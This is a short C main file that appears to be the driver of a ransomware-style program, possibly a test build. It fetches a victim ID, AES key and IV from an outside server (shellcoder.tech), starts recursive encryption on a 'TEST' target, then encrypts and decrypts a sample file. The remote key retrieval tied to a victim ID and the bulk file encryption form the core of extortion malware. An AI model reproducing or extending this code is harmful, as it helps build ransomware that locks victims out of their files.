#include "encrypt.h"
#include "curlHelper.h"
#include "fileRecursor.h"
#include <openssl/evp.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <sys/stat.h>
#include <openssl/aes.h>


int main (int argc, char ** argv) 
{
	if (argc != 2)
	{
		printf("[-] pass in file");
	}

	char ** parsedJson = curl("http://shellcoder.tech/sendEncrypt");
	char * id = parsedJson[0];

	unsigned char * key = (unsigned char *)parsedJson[1];

	unsigned char *iv = (unsigned char *)parsedJson[2];

	char * start = calloc(1,strlen("TEST")+1);
	strcpy(start,"TEST");
	startEncrypting(start,key,iv,id);
	encrypt("plaintext.txt",key,iv);
	printf("[-] Encryption finished\n");

	decrypt("plaintext.txt",key,iv);
	printf("Decryption finished\n");

	free(id);
	free(key);
	free(iv);

	return 1;
}

